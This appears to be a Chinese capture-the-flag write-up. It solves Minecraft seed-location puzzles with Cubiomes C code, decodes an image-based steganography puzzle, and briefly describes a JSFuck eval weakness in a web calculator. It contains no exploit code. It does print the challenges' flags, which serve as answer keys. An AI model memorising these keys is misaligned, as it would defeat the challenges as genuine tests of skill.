# SHCTF 3rd Writeup

Writeup提交于2月12日凌晨。

都是这个比赛的锅，Minecraft瘾又加重了（大雾

## MC-OSINT
工具链/参考文献：
- [PCL](https://github.com/Meloong-Git/PCL)：Minecraft启动器
- [ChunkBase](https://chunkbase.com/)：Minecraft地形生成网页工具
- [Cubiomes](https://github.com/cubitect/Cubiomes)：Minecraft地形生成C库
- [Cubiomes-Viewer](https://github.com/Cubitect/cubiomes-viewer)：Cubiomes的可视化工具
- [MinGW](https://mingw-w64.org/) (For GCC & make)
- [Git](https://git-scm.com/)：用于克隆Cubiomes
- [什么是生物群系？](https://zh.minecraft.wiki/w/%E7%94%9F%E7%89%A9%E7%BE%A4%E7%B3%BB)
- [什么是结构？](https://zh.minecraft.wiki/w/%E7%BB%93%E6%9E%84)
- [MineCraft 世界生成](https://zh.minecraft.wiki/w/%E4%B8%96%E7%95%8C%E7%94%9F%E6%88%90)

题目1、2、4：MC笑传之查ChunkBase。

只需要抓住截图和题目描述的特征，就可以在ChunkBase中找到。这三个题目x和z范围都是i16，就算手动翻阅并地毯式搜索，最多也就40分钟时间，如果你觉得自己是欧皇，就随便翻翻，可能更快些。下面给出这三个题目的特征：
- 题目1：存在4个村庄，**雪原（Snowy Plains）** 和 **平原（Plains）村庄（Village）** 各两个，距离相近。
- 题目2：一条西北-东南走向的河穿过 **针叶林（Taiga）**，南岸存在一个**村庄**。河里有一个 **宝箱（Treasure）**。棕色的东西是落叶，这里如果不注意人物朝向就容易看反落叶森林和针叶林（我做的时候只有这个是地毯式搜索的，花了我最多的时间）
- 题目4：图中稀有的群系是 **苍白花园（Pale Garden）**，右边有**樱花林（Cherry Grove）**，紧挨苍白花园还有 **黑森林（Dark Forest）** 和 **雪林（Grove）**。

注意：游戏中显示的坐标是人物的脚所在的方块坐标。例如，如果站在完整方块上，那么方块的坐标是人物坐标y值减一的结果。但蜂蜜块是不完整方块，人物脚和蜂蜜块在同一格立方体内，不需要减一。

### 题目三
一百万的范围，如果手翻chunkbase，得翻到猴年马月。显然，我们需要程序解法。

本来看到Cubiomes只支持到1.21.3，有些失落……后来发现，1.18后地图生成算法都大差不差，所以是可以用的。

开头先尝试了Cubiomes-viewer，获得了该地图正负一百万范围内所有掠夺者前哨站。然而Cubiomes-viewer并不支持按群系筛选结构，于是我尝试用Cubiomes写C程序解题。我从Cubiomes-viewer中dump下来了所有前哨站，一共52万个有余，结构如下：
```
Sep=;
#X1;-1008743
#Z1;-1033746
#X2;1009763
#Z2;1016932
种子;结构;X;Z;详细信息
78864256;pillager_outpost;-1008560;-1028592;
78864256;pillager_outpost;-1008480;-986512;
...
```

我们先`$ git clone https://github.com/Cubitect/cubiomes.git`。

按照 `README.md` 的指引，我们 `make` 一下，得到一个 `libcubiomes.a` 静态链接库。如果你没装make，你也可以在之后的编译里面直接包含Cubiomes的C源文件（注意排除 `tests.c`），但是这也就意味着每次都是全量编译，速度较慢。

```c
#include "cubiomes/generator.h"
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

typedef struct
{
    int x;
    int z;
} Coord;


Coord coords[1000000];



void readCoords()
{
    FILE* file = fopen("pilloutpost.txt", "r");
    // 舍弃前六行
    for (int i = 0; i < 6; i++)
    {
        char buffer[1024];
        fgets(buffer, sizeof(buffer), file);
    }

    // 读取坐标数据
    char buffer[1024];
    int i = 0;
    while (fgets(buffer, sizeof(buffer), file) != NULL) {
        // 去除末尾的换行字符
        buffer[strcspn(buffer, "\n")] = '\0';
        // printf("%s\n", buffer);
        char* token = strtok(buffer, ";");
        token = strtok(NULL, ";");

        token = strtok(NULL, ";");
        coords[i].x = atoi(token);
        token = strtok(NULL, ";");
        coords[i].z = atoi(token);
        i++;
        
    }
    fclose(file);
    printf("Read %d coords\n", i);
}


int main(int argc, char** argv)
{
    readCoords();
    uint64_t seed = 78864256;
    Generator g;

    setupGenerator(&g, MC_1_21_3, 0);
    applySeed(&g, DIM_OVERWORLD, seed);
    
    uint16_t amount = 0;

    for (int i = 0; i < 1000000; i++)
    {
        int x = coords[i].x;
        int z = coords[i].z;
        if (x == 0 && z == 0) {
            break;
        }
        // 参数分别为：群系生成器指针、判定尺度、xyz坐标
        // - 判定尺度：只能为1或4. MC中，每4x4x4的范围是一个生物群系单位，这个区域内的方块一定是同一生物群系的。
        //   - 如果你选择传入1，那么它内部会先把xyz换算为生物群系单位（地板除4）再参与群系具体运算。
        // 群系生成涉及多种参数的噪声函数，Cubiomes为我们封装好，无需担心。
        int biomeID = getBiomeAt(&g, 1, x, 256, z);
        if (biomeID == jagged_peaks) {
            printf("Outpost in Jagged Peaks: %d,%d\n", x, z);
            amount++;
        }
    }
    printf("Total amount: %d\n", amount);

    
    return 0;
}
```

```sh
gcc solution1.c cubiomes/libcubiomes.a -fwrapv -lm -o solution
./solution
```

```
Outpost in Jagged Peaks: 997232,-547824
Outpost in Jagged Peaks: 997728,-226976
Outpost in Jagged Peaks: 999664,-699312
Outpost in Jagged Peaks: 999552,245952
Outpost in Jagged Peaks: 1001760,-608192
Outpost in Jagged Peaks: 1002256,-641520
Outpost in Jagged Peaks: 1003120,684880
Outpost in Jagged Peaks: 1003520,-595744
Outpost in Jagged Peaks: 1003840,885504
Outpost in Jagged Peaks: 1005840,-497984
Outpost in Jagged Peaks: 1006912,209696
Outpost in Jagged Peaks: 1006832,220752
Outpost in Jagged Peaks: 1007728,235312
Outpost in Jagged Peaks: 1008480,-778000
Outpost in Jagged Peaks: 1009152,-214896
Total amount: 3566
```
三千五还是太多了，我们需要用高度来筛选更合适的值。

翻看头文件，看到这么一个函数：
```c
/**
 * Map an approximation of the Overworld surface height.
 * The horizontal scaling is 1:4. If non-null, the ids are filled with the
 * biomes of the area. The height (written to y) is in blocks.
 */
int mapApproxHeight(float *y, int *ids, const Generator *g,
    const SurfaceNoise *sn, int x, int z, int w, int h);
```
可以猜得到，这里的y应该是做二维数组的，表示每个4*4方格（一个生物群系单元的水平面积大小）的高度值。需要注意的是，这是大致高度值，并不意味着这个地方一定就是这么高，但至少和实际高度是正相关的。

打开源码看看：
```c
int mapApproxHeight(float *y, int *ids, const Generator *g, const SurfaceNoise *sn,
    int x, int z, int w, int h)
{
    if (g->dim == DIM_NETHER)
        return 127;

    if (g->dim == DIM_END)
    {
        if (g->mc <= MC_1_8)
            return 1;
        return mapEndSurfaceHeight(y, &g->en, sn, x, z, w, h, 4, 0);
    }

    if (g->mc >= MC_1_18)
    {
        if (g->bn.nptype != -1 && g->bn.nptype != NP_DEPTH)
            return 1;
        int64_t i, j;
        for (j = 0; j < h; j++)
        {
            for (i = 0; i < w; i++)
            {
                int flags = 0;//SAMPLE_NO_SHIFT;
                int64_t np[6];
                int id = sampleBiomeNoise(&g->bn, np, x+i, 0, z+j, 0, flags);
                if (ids)
                    ids[j*w+i] = id;
                y[j*w+i] = np[NP_DEPTH] / 76.0;
            }
        }
        return 0;
    }
    else if (...)
    ...
}
```
一看：
- 对于1.18之后的版本，只需要看我们截取的部分，这部分已经 `return 0` 了，后面的都没用了。
- 在对ids进行赋值时，对ids进行了判断，说明ids是可选的。因为我们已经筛选出了位于尖峭山峰的前哨站，所以不再需要获知群系类型，因此传NULL就可以了。（上面注释也说了）
- 而 `SurfaceNoise *sn` 在截取部分的代码中没有出现，说明也是我们不需要的，传NULL即可。

修改主函数，检查以前哨站所在点为中心，周围4\*4个4\*4块（也就是一个区块大小，但不一定就是一个区块）的大致高度值，大于210就输出：
```c
float max_in_16(float *arr)
{
    float max = arr[0];
    for (int i = 1; i < 16; i++)
    {
        if (arr[i] > max)
        {
            max = arr[i];
        }
    }
    return max;
}


int main(int argc, char** argv)
{
    readCoords();
    uint64_t seed = 78864256;
    Generator g;

    setupGenerator(&g, MC_1_21_3, 0);
    applySeed(&g, DIM_OVERWORLD, seed);
    // initSurfaceNoise(&sn, DIM_OVERWORLD, seed);
    
    uint16_t amount = 0;
    uint16_t high = 0;

    int rankings[128];

    for (int i = 0; i < 1000000; i++)
    {
        int x = coords[i].x;
        int z = coords[i].z;
        if (x == 0 && z == 0) {
            break;
        }
        int biomeID = getBiomeAt(&g, 1, x, 256, z);
        
        if (biomeID == jagged_peaks) {
            // printf("Outpost in Jagged Peaks: %d,%d\n", x, z);
            float *heights = (float *)malloc(16 * sizeof(float));
            
            mapApproxHeight(heights, NULL, &g, NULL, (x >> 2) - 2, (z >> 2) - 2, 4, 4);
            float max = max_in_16(heights);
            if (max >= 210) {
                printf("Outpost in Jagged Peaks, higher than 210: %d,%f,%d\n", x, max, z);
                ++high;
            }
            // printf("Max height: %f\n", max_in_16(heights));
            amount++;
        }
    }
    printf("Total amount: %d\n", amount);
    printf("High amount: %d\n", high);

    
    return 0;
}
```

```
Outpost in Jagged Peaks, higher than 210: -994688,225.763153,-653760
Outpost in Jagged Peaks, higher than 210: -969936,224.223679,-121824
Outpost in Jagged Peaks, higher than 210: -965504,243.789474,925824
Outpost in Jagged Peaks, higher than 210: -964320,226.013153,-233936
Outpost in Jagged Peaks, higher than 210: -903568,210.486847,622336
Outpost in Jagged Peaks, higher than 210: -843568,223.605270,-91280
Outpost in Jagged Peaks, higher than 210: -809408,212.447372,-4016
Outpost in Jagged Peaks, higher than 210: -804176,218.723679,-468336
Outpost in Jagged Peaks, higher than 210: -801088,218.526321,-852896
Outpost in Jagged Peaks, higher than 210: -791248,221.710526,-556960
Outpost in Jagged Peaks, higher than 210: -785120,223.631577,557216
Outpost in Jagged Peaks, higher than 210: -723296,223.868423,-499984
Outpost in Jagged Peaks, higher than 210: -677520,210.368423,-416176
Outpost in Jagged Peaks, higher than 210: -674704,214.131577,-105888
Outpost in Jagged Peaks, higher than 210: -651264,216.947372,-1296
Outpost in Jagged Peaks, higher than 210: -650512,218.815796,-1009360
Outpost in Jagged Peaks, higher than 210: -647680,238.618423,828608
Outpost in Jagged Peaks, higher than 210: -643968,229.394730,495104
Outpost in Jagged Peaks, higher than 210: -614032,220.065796,666768
Outpost in Jagged Peaks, higher than 210: -608224,228.381577,96368
Outpost in Jagged Peaks, higher than 210: -579504,220.236847,-302016
Outpost in Jagged Peaks, higher than 210: -504144,210.631577,951664
Outpost in Jagged Peaks, higher than 210: -434112,216.736847,-740256
Outpost in Jagged Peaks, higher than 210: -392512,213.434204,873504
Outpost in Jagged Peaks, higher than 210: -356704,218.342102,-826032
Outpost in Jagged Peaks, higher than 210: -268288,231.210526,730912
Outpost in Jagged Peaks, higher than 210: -267424,215.460526,-56112
Outpost in Jagged Peaks, higher than 210: -237904,223.605270,531296
Outpost in Jagged Peaks, higher than 210: -227824,227.052628,522048
Outpost in Jagged Peaks, higher than 210: -196496,221.618423,39152
Outpost in Jagged Peaks, higher than 210: -195520,239.526321,-564112
Outpost in Jagged Peaks, higher than 210: -143808,220.552628,-351056
Outpost in Jagged Peaks, higher than 210: -142144,215.355270,396464
Outpost in Jagged Peaks, higher than 210: -138512,227.671051,-396080
Outpost in Jagged Peaks, higher than 210: -105248,218.723679,362192
Outpost in Jagged Peaks, higher than 210: -93936,213.026321,889008
Outpost in Jagged Peaks, higher than 210: -85904,222.763153,572720
Outpost in Jagged Peaks, higher than 210: -48064,225.000000,165456
Outpost in Jagged Peaks, higher than 210: -34208,235.263153,-824160
Outpost in Jagged Peaks, higher than 210: -17568,218.934204,858928
Outpost in Jagged Peaks, higher than 210: -6336,220.539474,765008
Outpost in Jagged Peaks, higher than 210: 4320,230.078949,-436704
Outpost in Jagged Peaks, higher than 210: 7232,238.342102,828192
Outpost in Jagged Peaks, higher than 210: 22368,234.763153,-999584
Outpost in Jagged Peaks, higher than 210: 37040,244.907898,352576
Outpost in Jagged Peaks, higher than 210: 53392,214.026321,-299280
Outpost in Jagged Peaks, higher than 210: 63584,214.618423,-718080
Outpost in Jagged Peaks, higher than 210: 96288,224.355270,-312080
Outpost in Jagged Peaks, higher than 210: 110848,241.789474,505344
Outpost in Jagged Peaks, higher than 210: 166464,223.828949,-332464
Outpost in Jagged Peaks, higher than 210: 192672,220.486847,-522592
Outpost in Jagged Peaks, higher than 210: 192576,220.921051,843568
Outpost in Jagged Peaks, higher than 210: 228432,230.210526,52592
Outpost in Jagged Peaks, higher than 210: 250368,228.947372,900736
Outpost in Jagged Peaks, higher than 210: 281408,210.513153,24416
Outpost in Jagged Peaks, higher than 210: 283408,236.736847,-1019088
Outpost in Jagged Peaks, higher than 210: 284208,243.013153,269888
Outpost in Jagged Peaks, higher than 210: 288832,212.842102,-238752
Outpost in Jagged Peaks, higher than 210: 327008,218.052628,507632
Outpost in Jagged Peaks, higher than 210: 341328,243.394730,686368
Outpost in Jagged Peaks, higher than 210: 358064,228.026321,-604928
Outpost in Jagged Peaks, higher than 210: 373616,238.302628,77408
Outpost in Jagged Peaks, higher than 210: 378080,216.263153,142928
Outpost in Jagged Peaks, higher than 210: 392464,232.697372,854608
Outpost in Jagged Peaks, higher than 210: 409680,222.039474,121136
Outpost in Jagged Peaks, higher than 210: 417328,213.592102,865536
Outpost in Jagged Peaks, higher than 210: 423168,212.250000,150848
Outpost in Jagged Peaks, higher than 210: 432672,236.539474,923232
Outpost in Jagged Peaks, higher than 210: 459776,223.644730,-383344
Outpost in Jagged Peaks, higher than 210: 461840,222.750000,370416
Outpost in Jagged Peaks, higher than 210: 485648,234.131577,-832672
Outpost in Jagged Peaks, higher than 210: 550608,218.381577,-26864
Outpost in Jagged Peaks, higher than 210: 554112,219.315796,140400
Outpost in Jagged Peaks, higher than 210: 559168,218.276321,-335840
Outpost in Jagged Peaks, higher than 210: 594464,245.486847,-617952
Outpost in Jagged Peaks, higher than 210: 608496,220.184204,-375744
Outpost in Jagged Peaks, higher than 210: 619328,221.065796,106736
Outpost in Jagged Peaks, higher than 210: 620288,239.065796,-565520
Outpost in Jagged Peaks, higher than 210: 656896,232.013153,871648
Outpost in Jagged Peaks, higher than 210: 659568,233.513153,-675808
Outpost in Jagged Peaks, higher than 210: 661872,225.921051,-864688
Outpost in Jagged Peaks, higher than 210: 679728,221.381577,541792
Outpost in Jagged Peaks, higher than 210: 690000,225.539474,-435904
Outpost in Jagged Peaks, higher than 210: 704832,211.263153,519456
Outpost in Jagged Peaks, higher than 210: 709376,216.697372,415248
Outpost in Jagged Peaks, higher than 210: 749424,226.828949,-42912
Outpost in Jagged Peaks, higher than 210: 753200,223.828949,-68032
Outpost in Jagged Peaks, higher than 210: 759600,219.000000,-485232
Outpost in Jagged Peaks, higher than 210: 760016,233.394730,-484848
Outpost in Jagged Peaks, higher than 210: 768880,232.236847,208896
Outpost in Jagged Peaks, higher than 210: 778000,222.223679,600432
Outpost in Jagged Peaks, higher than 210: 803504,234.657898,315024
Outpost in Jagged Peaks, higher than 210: 830320,230.447372,194240
Outpost in Jagged Peaks, higher than 210: 833792,215.421051,707216
Outpost in Jagged Peaks, higher than 210: 872592,238.105270,-395920
Outpost in Jagged Peaks, higher than 210: 929648,230.000000,28896
Outpost in Jagged Peaks, higher than 210: 951136,232.842102,551568
Outpost in Jagged Peaks, higher than 210: 997728,231.078949,-226976
```
98个前哨站，跟3000多个比起来已经很少了，但这样看还是太费劲了。我已经写累了C语言，于是把输出内容保存到txt里面交给Python排序。
```py
with open("output.txt", "r") as f:
    lines = f.readlines()

entry = []

for line in lines:
    entry.append([float(s.strip()) for s in line.split(":")[1].split(",")] + [line])

entry.sort(key=lambda x: x[1])

for e in entry:
    print(e[-1],end="")
```
结果如下：
```
...
Outpost in Jagged Peaks, higher than 210: 659568,233.513153,-675808
Outpost in Jagged Peaks, higher than 210: 485648,234.131577,-832672
Outpost in Jagged Peaks, higher than 210: 803504,234.657898,315024
Outpost in Jagged Peaks, higher than 210: 22368,234.763153,-999584
Outpost in Jagged Peaks, higher than 210: -34208,235.263153,-824160
Outpost in Jagged Peaks, higher than 210: 432672,236.539474,923232
Outpost in Jagged Peaks, higher than 210: 283408,236.736847,-1019088
Outpost in Jagged Peaks, higher than 210: 872592,238.105270,-395920
Outpost in Jagged Peaks, higher than 210: 373616,238.302628,77408
Outpost in Jagged Peaks, higher than 210: 7232,238.342102,828192
Outpost in Jagged Peaks, higher than 210: -647680,238.618423,828608
Outpost in Jagged Peaks, higher than 210: 620288,239.065796,-565520
Outpost in Jagged Peaks, higher than 210: -195520,239.526321,-564112
Outpost in Jagged Peaks, higher than 210: 110848,241.789474,505344
Outpost in Jagged Peaks, higher than 210: 284208,243.013153,269888
Outpost in Jagged Peaks, higher than 210: 341328,243.394730,686368
Outpost in Jagged Peaks, higher than 210: -965504,243.789474,925824
Outpost in Jagged Peaks, higher than 210: 37040,244.907898,352576
Outpost in Jagged Peaks, higher than 210: 594464,245.486847,-617952
```
由于检查了16*16的范围，而前哨站未必屹立在它们中的最高点，所以我们需要进入游戏tp指令实地考察一下。

经过考察，位于第六名的前哨站x=110848 z=505344是所求的前哨站，调整位置角度使得画面能够和附件匹配。

Flag： `SHCTF{110860,274,505337}`

### 前三题

这里我们也给出前三题的程序解：

#### 1
```c
#include "cubiomes/generator.h"
#include "cubiomes/finders.h"
#include <stdint.h>
#include <stdio.h>
#include <stdbool.h>

STRUCT(VillageEntry)
{
    int x, z;
    int type;
};

VillageEntry villageEntries[100000];

// 用曼哈顿距离是因为我觉得算起来快（
int manhattanDistance(int x1, int z1, int x2, int z2) {
    return abs(x1 - x2) + abs(z1 - z2);
}
// 在数组中查找满足条件（谓词predicate）的元素数量
int findInArray(VillageEntry *arr, int left, int right, bool predicate(VillageEntry entry)) {
    int counter = 0;
    if (left < 0) {
        left = 0;
    }
    for (int i = left; i < right; i++) {
        VillageEntry entry = arr[i];
        if (entry.type == 0) {
            break;
        }

        if (predicate(arr[i])) {
            counter++;
        }
    }
    return counter;
}

// 从一个比较小的值（比如300）开始逐渐提升，直到编译运行后输出内容
const int THRESHOLD = 800;

// C不让我写闭包，只能这么写。当然，你可以把C换成C++，然后写lambda函数
VillageEntry *villageToCompare = NULL;
bool predicate(VillageEntry entry) {
    return entry.type == snowy_plains
    && manhattanDistance(entry.x, entry.z, villageToCompare->x, villageToCompare->z) <= THRESHOLD
    && manhattanDistance(entry.x, entry.z, villageToCompare->x, villageToCompare->z) > 0;
}

bool predicate2(VillageEntry entry) {
    return entry.type == plains
    && manhattanDistance(entry.x, entry.z, villageToCompare->x, villageToCompare->z) <= THRESHOLD
    && manhattanDistance(entry.x, entry.z, villageToCompare->x, villageToCompare->z) > 0;
}

int main()
{
    uint64_t seed = 78864256;
    Generator g;
    int MINECRAFT_VERSION = MC_1_21_3;

    setupGenerator(&g, MINECRAFT_VERSION, 0);
    applySeed(&g, DIM_OVERWORLD, seed);

    StructureConfig sconf;

    getStructureConfig(Village, MINECRAFT_VERSION, &sconf);
    int village_region_size = sconf.regionSize; // in chunks
    int range_right = 32768 / 16; // in chunks
    int region_range_right = range_right / village_region_size; // in regions
    // 结构生成的单位是区域（region)，详情请看Wiki，这里不展开讲
    int i = 0;


    for (int regX = -region_range_right; regX <= region_range_right; regX++)
    {
        for (int regZ = -region_range_right; regZ <= region_range_right; regZ++)
        {
            Pos block_pos;
            int res = getStructurePos(Village, MINECRAFT_VERSION, seed, regX, regZ, &block_pos);
            if (res == 0) {
                printf("Position is invalid: %d, %d\n", block_pos.x, block_pos.z);
            }
            bool is_viable = isViableStructurePos(Village, &g, block_pos.x, block_pos.z, 0);
            if (!is_viable) {
                // printf("Position is not viable: %d, %d\n", block_pos.x, block_pos.z);
                continue;
            }
            int biomeID = getBiomeAt(&g, 1, block_pos.x, 256, block_pos.z);
            if (biomeID != plains && biomeID != snowy_plains) {
                continue;
            }
            villageEntries[i] = (VillageEntry) {
                .x = block_pos.x,
                .z = block_pos.z,
                .type = biomeID
            };
            i++;
        }
    }
    // 遍历雪原村庄，并搜索周边雪原村庄和平原村庄的个数
    for (int i = 0; i < 100000; i++) {
        VillageEntry entry = villageEntries[i];
        villageToCompare = &entry; // 每次把正被比较的赋给全局变量，达到类似闭包的效果
        if (villageEntries[i].x == 0 && villageEntries[i].z == 0 && villageEntries[i].type == 0) {
            break;
        }
        if (entry.type == plains) {
            continue;
        }
        int nearby_sn_pl_count = findInArray(villageEntries, i, 100000, predicate);
        int nearby_pl_count = findInArray(villageEntries, i, 100000, predicate2);
        // printf("Nearby snowy plains: %d, nearby plains: %d\n", nearby_sn_pl_count, nearby_pl_count);
        if (nearby_pl_count >= 2 && nearby_sn_pl_count >= 1) {
            printf("Village at %d, %d\n", villageEntries[i].x, villageEntries[i].z);
        }
    }

    return 0;
}
```

#### 2
```c
#include "cubiomes/generator.h"
#include "cubiomes/finders.h"
#include <stdint.h>
#include <stdio.h>
#include <stdbool.h>


uint64_t seed = 78864256;
Generator g;
int MINECRAFT_VERSION = MC_1_21_3;



void dumpVillages(bool predicate(int x, int z, int biomeID)) {
    FILE *file = fopen("villages.json", "w");
    bool first = true;

    
    StructureConfig sconf;

    getStructureConfig(Village, MINECRAFT_VERSION, &sconf);
    int village_region_size = sconf.regionSize; // in chunks
    int range_right = 32768 / 16; // in chunks
    int region_range_right = range_right / village_region_size; // in regions
    int i = 0;
    fprintf(file, "[\n");

    for (int regX = -region_range_right; regX <= region_range_right; regX++)
    {
        for (int regZ = -region_range_right; regZ <= region_range_right; regZ++)
        {
            Pos block_pos;
            int res = getStructurePos(Village, MINECRAFT_VERSION, seed, regX, regZ, &block_pos);
            if (res == 0) {
                // printf("Position is invalid: %d, %d\n", block_pos.x, block_pos.z);
                continue;
            }
            bool is_viable = isViableStructurePos(Village, &g, block_pos.x, block_pos.z, 0);
            if (!is_viable) {
                // printf("Position is not viable: %d, %d\n", block_pos.x, block_pos.z);
                continue;
            }
            int biomeID = getBiomeAt(&g, 1, block_pos.x, 256, block_pos.z);
            if (!predicate(block_pos.x, block_pos.z, biomeID)) {
                continue;
            }

            
            if (!first) {
                fprintf(file, ",\n");
            } else {
                first = false;
            }
            fprintf(file, "{\"x\":%d,\"z\":%d,\"type\":%d}", block_pos.x, block_pos.z, biomeID);

            i++;
        }
    }
    fprintf(file, "\n]\n");
    fclose(file);

}

void dumpTreasures() {
    FILE *file = fopen("treasures.json", "w");
    bool first = true;

    fprintf(file, "[\n");
    
    StructureConfig sconf;

    const int STRUCTURE_TYPE = Treasure;

    getStructureConfig(STRUCTURE_TYPE, MINECRAFT_VERSION, &sconf);
    int strcture_region_size = sconf.regionSize; // in chunks
    int range_right = 32768 / 16; // in chunks
    int region_range_right = range_right / strcture_region_size; // in regions
    int i = 0;


    for (int regX = -region_range_right; regX <= region_range_right; regX++)
    {
        for (int regZ = -region_range_right; regZ <= region_range_right; regZ++)
        {
            Pos block_pos;
            int res = getStructurePos(STRUCTURE_TYPE, MINECRAFT_VERSION, seed, regX, regZ, &block_pos);
            if (res == 0) {
                // printf("Position is invalid: %d, %d\n", block_pos.x, block_pos.z);
                continue; // 这个continue不写你半天都写入不完
            }
            bool is_viable = isViableStructurePos(STRUCTURE_TYPE, &g, block_pos.x, block_pos.z, 0);
            if (!is_viable) {
                // printf("Position is not viable: %d, %d\n", block_pos.x, block_pos.z);
                continue;
            }
            int biomeID = getBiomeAt(&g, 1, block_pos.x, 256, block_pos.z);

            
            if (!first) {
                fprintf(file, ",\n");
            } else {
                first = false;
            }
            fprintf(file, "{\"x\":%d,\"z\":%d,\"type\":%d}", block_pos.x, block_pos.z, biomeID);

            i++;
        }
    }
    fprintf(file, "\n]\n");
    fclose(file);


}

bool isTaiga(int x, int z, int biomeID) {

    return biomeID == taiga
    && getBiomeAt(&g, 1, x - 120, 256, z) == forest
    && getBiomeAt(&g, 1, x - 140, 256, z - 150) == forest
    && (getBiomeAt(&g, 1, x - 200, 256, z) == plains || getBiomeAt(&g, 1, x - 250, 256, z) == plains);
    // 村庄太多，不得不用这个限定一下，这个距离我也是目测乱猜的
}


int main()
{

    setupGenerator(&g, MINECRAFT_VERSION, 0);
    applySeed(&g, DIM_OVERWORLD, seed);

    dumpVillages(isTaiga);
    dumpTreasures();
    return 0;
}
```

```py
import json

RIVER = 7
BEACH = 16

with open("villages.json") as fv:
    villages = json.load(fv)

with open("treasures.json") as ft:
    treasures = json.load(ft)

for village in villages:
    nearest_distance = min(((treasure["x"] - village["x"])**2 + (treasure["z"] - village["z"])**2)**0.5 for treasure in treasures)
    if nearest_distance < 500:
        print(f"/tp {village["x"]} 120 {village["z"]}")
```
宝藏可以使用 `/locate structure minecraft:buried_treasure` 命令来查找。

#### 4
两步走，先生成bitmap，再分析，因为第一步不需太需要更改，但是又耗时。

1.21.5提高了苍白之园的生产率，导致可能Cubiomes不太可行。但是没关系，答主我用无情铁手填写B树，做了一个patch版本：https://github.com/Zes-Minkey-Young/Cubiomes

```cpp
#include "cb/generator.h"
#include "cb/finders.h"
#include <iostream>
#include <vector>
#include <fstream>


const int UNIT = 16;
const int half_size = 32768 / UNIT;



int *ids;


int main() {
    uint64_t seed = 78864256;
    Generator g;
    int MINECRAFT_VERSION = MC_1_21_11;

    setupGenerator(&g, MINECRAFT_VERSION, 0);
    applySeed(&g, DIM_OVERWORLD, seed);

    Range r = {UNIT, -half_size, -half_size, half_size * 2, half_size * 2, 64, 1};
    ids = allocCache(&g, r);
    std::cout << "Getting biomes..." << std::endl;
    int res = genBiomes(&g, ids, r);
    std::cout << "Generation completed, code:" << res << std::endl;
    // auto seen_pale_garden = new std::vector<Pos>;
    if (res != 0) {
        return res;
    }

    std::ofstream out_file("./map.i32", std::ios::binary);

    if (!out_file) {
        std::cerr << "Unable to open." << std::endl;
        return 114;
    }
    out_file.write(reinterpret_cast<char*>(ids),  half_size * half_size * 4 * sizeof(int));
    out_file.close();
}
```

鄙人算法写得不太行，不能提供后续程序解，请见谅。

## Misc

### 提问前请先搜索
打开靶机浏览，就可以看到Flag。这个不能复制，只能手敲过去。

### SHSolver

给了一张图片，上面每一排都是QQ等级的图标，有特别多排。顺便说一下，QQ等级是四进制的，皇冠为64，太阳为16，月亮为4，星星为1。

第一想法就是，每一排的等级都代表一个ASCII码。并且注意到：有很多个双太阳（32）的重复，看起来像是个分隔符，也就是 `0x20`，而这恰好也就是空格，印证了猜想。

进一步，试图按此法解密前面8行，得到一个有意义的字符串：`New York`，说明我们的思路是正确的。

写个脚本来解密，不过在此之前，我们先确定网格的大小：
```py
from PIL import Image
import numpy as np

img = Image.open('shsolver.jpg')
arr = np.array(img)

# 修改下面几个常量直到看着规整
LEFT_PADDING = 16
TOP_PADDING = 16
CHAR_WIDTH = 32
CHAR_HEIGHT = 40

arr[TOP_PADDING:img.height:1, LEFT_PADDING:img.width:CHAR_WIDTH] = [255, 255, 255]
arr[TOP_PADDING:img.height:CHAR_HEIGHT, LEFT_PADDING:img.width:1] = [255, 255, 255]

img_new = Image.fromarray(arr)
img_new.show()
```
经过反复的测试，上面几个常量就是合适的。接下来：
```py
def getCellAt(line, col):
    return arr[TOP_PADDING + line * CHAR_HEIGHT:TOP_PADDING + (line + 1) * CHAR_HEIGHT, 
               LEFT_PADDING + col * CHAR_WIDTH:LEFT_PADDING + (col + 1) * CHAR_WIDTH]

CROWN = getCellAt(0, 0)
SUN = getCellAt(1, 1)
MOON = getCellAt(0, 1)
STAR = getCellAt(0, 4)
BLANK = getCellAt(0, 7)

# 使用均方差作为判断图片相似的标准
def mse(arr1, arr2):
    return np.mean((arr1 - arr2) ** 2)

def getValueAt(line, col):
    cell = getCellAt(line, col)
    # 这几个阈值也是试出来的
    if mse(cell, BLANK) < 20:
        return 0
    elif mse(cell, CROWN) < 45:
        return 64
    elif mse(cell, SUN) < 45:
        return 16
    elif mse(cell, MOON) < 40:
        return 4
    elif mse(cell, STAR) < 40:
        return 1
    else:
        return 0
    

print(mse(BLANK,CROWN),mse(CROWN, SUN), mse(CROWN, MOON), mse(CROWN, STAR), mse(CROWN, getCellAt(1, 0)), mse(CROWN, getCellAt(2, 0)))

for line in range(1145):
    value = 0
    for col in range(1145):
        val = getValueAt(line, col)
        #print(line, col, val)
        if val == 0:
            break

        value += val

    print(chr(value),end="")
```

```
New York is 3 hours ahead of California,
but it does not make California slow.
Someone graduated at the age of 22,
but waited 5 years before securing a good job!
Someone became a CEO at 25,
and died at 50.
While another became a CEO at 50,
and lived to 90 years.
Someone is still single,
while someone else got married.
Obama retires at 55,
but Trump starts at 70.
Absolutely everyone in this world works based on their Time Zone.
People around you might seem to go ahead of you,
some might seem to be behind you.
But everyone is running their own RACE, in their own TIME.
Don't envy them or mock them.
They are in their TIME ZONE, and you are in yours!
Life is about waiting for the right moment to act.
So, RELAX.
You're not LATE.
Here is your gift (please remove all spaces): 
fTE0cF8 xVWZw SWV IX2Ffcj N0VXBNT 0NfUl Uje V9F azRNe 0ZUQ0hT
You're not EARLY.
You are very much ON TIME, and in your TIME ZONE Destiny set up for you.
```
没想到是个经典的诗！注意到：`fTE0cF8 xVWZw SWV IX2Ffcj N0VXBNT 0NfUl Uje V9F azRNe 0ZUQ0hT`

一开始把它当leet语了，我说这也看不懂啊？然后才想起来这个像base64。在DevTools（写起来简单）里解码一下：
```js
> atob("fTE0cF8xVWZwSWVIX2FfcjN0VXBNT0NfUlUjeV9FazRNe0ZUQ0hT")
'}14p_1UfpIeH_a_r3tUpMOC_RU#y_Ek4M{FTCHS'
```
嚯，还要我手动把它转过来。
```py
>>> '}14p_1UfpIeH_a_r3tUpMOC_RU#y_Ek4M{FTCHS'[::-1]
'SHCTF{M4kE_y#UR_COMpUt3r_a_HeIpfU1_p41}'
```

完成。

## Web

### Calc?js?fuck!

标题就已经告诉怎么做了。

下载附件可以看到含有正则过滤，仅允许数字、`+-*/[]()` 还有!符。这本身没啥毛病，但是谁家用eval来做计算器？JS里面的感叹号又不是阶乘。

